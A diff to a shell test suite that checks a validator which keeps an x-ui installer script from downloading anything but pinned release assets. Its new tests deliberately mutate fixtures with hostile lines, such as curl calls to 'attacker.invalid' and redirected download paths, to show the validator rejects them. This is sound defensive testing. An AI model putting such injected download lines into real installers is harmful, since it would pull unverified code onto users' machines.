@@ -93,6 +93,25 @@ write_installer_fixture() {
   chmod 0600 "$destination"
 }
 
+write_latest_resolver_installer_fixture() {
+  local destination=$1 base="${1}.base"
+  write_installer_fixture "$base"
+  awk -v resolver="$PROJECT_ROOT/tests/fixtures/xui-v3.7.0-latest-resolver.txt" '
+    /^install_x-ui\(\) \{/ {
+      while ((getline line < resolver) > 0) print line
+      close(resolver)
+    }
+    /^  if \[ \$# == 0 \]; then$/ {
+      print
+      print "    tag_version=$(resolve_latest_tag)"
+      next
+    }
+    { print }
+  ' "$base" >"$destination"
+  rm -f "$base"
+  chmod 0600 "$destination"
+}
+
 replace_fixture_literal() {
   local source=$1 destination=$2 needle=$3 replacement=$4
   awk -v needle="$needle" -v replacement="$replacement" '
@@ -162,6 +181,50 @@ test_installer_downloader_shape_accepts_expected_fixture() {
     "$REPOSITORY" "$TAG" "$ARCH"
   assert_success okp_xui_validate_pinned_installer_downloaders "$installer" \
     "$REPOSITORY" "$TAG" arm64
+}
+
+test_bare_curl_counter_handles_empty_filter_portably() {
+  local code=$'curl -fsSL https://example.invalid/one\n    curl -o /tmp/two https://example.invalid/two\nnot_curl value\n# curl ignored'
+  assert_eq 2 "$(_okp_xui_count_bare_curl_with "$code" '')"
+  assert_eq 1 "$(_okp_xui_count_bare_curl_with "$code" 'https://example.invalid/two')"
+  assert_eq 0 "$(_okp_xui_count_bare_curl_with "$code" 'missing')"
+}
+
+test_installer_downloader_shape_accepts_latest_resolver() {
+  local installer=$TEST_SANDBOX/installer-latest-resolver.sh code
+  write_latest_resolver_installer_fixture "$installer"
+  code=$(awk '!/^[[:space:]]*#/' "$installer")
+  assert_eq 8 "$(_okp_xui_count_bare_curl_with "$code" '')"
+  assert_eq 2 "$(_okp_xui_count_assignment "$code" url)"
+  assert_success okp_xui_validate_pinned_installer_downloaders "$installer" "$REPOSITORY" v3.7.0 amd64
+  assert_success okp_xui_validate_pinned_installer_downloaders "$installer" "$REPOSITORY" v3.7.0 arm64
+}
+
+test_latest_resolver_does_not_relax_download_guards() {
+  local valid=$TEST_SANDBOX/installer-resolver-valid.sh mutated=$TEST_SANDBOX/installer-resolver-mutated.sh
+  write_latest_resolver_installer_fixture "$valid"
+  replace_fixture_literal "$valid" "$mutated" \
+    'https://github.com/MHSanaei/3x-ui/releases/latest' 'https://attacker.invalid/releases/latest'
+  assert_failure okp_xui_validate_pinned_installer_downloaders "$mutated" "$REPOSITORY" v3.7.0 "$ARCH"
+  replace_fixture_literal "$valid" "$mutated" '-o /dev/null' '-o /usr/local/x-ui-linux-amd64.tar.gz'
+  assert_failure okp_xui_validate_pinned_installer_downloaders "$mutated" "$REPOSITORY" v3.7.0 "$ARCH"
+  replace_fixture_literal "$valid" "$mutated" 'local url tag' 'local tag'
+  assert_failure okp_xui_validate_pinned_installer_downloaders "$mutated" "$REPOSITORY" v3.7.0 "$ARCH"
+  replace_fixture_literal "$valid" "$mutated" 'tag_version=$1' 'tag_version=$(resolve_latest_tag)'
+  assert_failure okp_xui_validate_pinned_installer_downloaders "$mutated" "$REPOSITORY" v3.7.0 "$ARCH"
+  replace_fixture_literal "$valid" "$mutated" \
+    '-o ${xui_folder}-linux-$(arch).tar.gz ${url}' '-o /tmp/unverified.tar.gz ${url}'
+  assert_failure okp_xui_validate_pinned_installer_downloaders "$mutated" "$REPOSITORY" v3.7.0 "$ARCH"
+  replace_fixture_literal "$valid" "$mutated" \
+    'curl -fLRo "${xui_script_temp}"' '/usr/bin/curl -fLRo "${xui_script_temp}"'
+  assert_failure okp_xui_validate_pinned_installer_downloaders "$mutated" "$REPOSITORY" v3.7.0 "$ARCH"
+  awk '/^install_x-ui \$1$/ { print "curl -fsSL https://attacker.invalid/extra" } { print }' "$valid" >"$mutated"
+  assert_failure okp_xui_validate_pinned_installer_downloaders "$mutated" "$REPOSITORY" v3.7.0 "$ARCH"
+  awk -v resolver="$PROJECT_ROOT/tests/fixtures/xui-v3.7.0-latest-resolver.txt" '
+    { print }
+    END { while ((getline line < resolver) > 0) print line }
+  ' "$valid" >"$mutated"
+  assert_failure okp_xui_validate_pinned_installer_downloaders "$mutated" "$REPOSITORY" v3.7.0 "$ARCH"
 }
 
 test_installer_downloader_shape_rejects_bypasses() {
@@ -315,6 +378,12 @@ run_test 'release metadata selects one exact asset with SHA-256' \
   test_release_metadata_requires_one_exact_digested_asset
 run_test 'installer downloader shape accepts the pinned curl contract' \
   test_installer_downloader_shape_accepts_expected_fixture
+run_test 'bare curl counting supports empty filters on BusyBox awk' \
+  test_bare_curl_counter_handles_empty_filter_portably
+run_test 'v3.7.0 latest-tag resolver is compatible with pinned downloads' \
+  test_installer_downloader_shape_accepts_latest_resolver
+run_test 'v3.7.0 resolver support preserves download guards' \
+  test_latest_resolver_does_not_relax_download_guards
 run_test 'installer downloader shape rejects curl and wget bypasses' \
   test_installer_downloader_shape_rejects_bypasses
 run_test 'installer downloader shape rejects changed resources' \
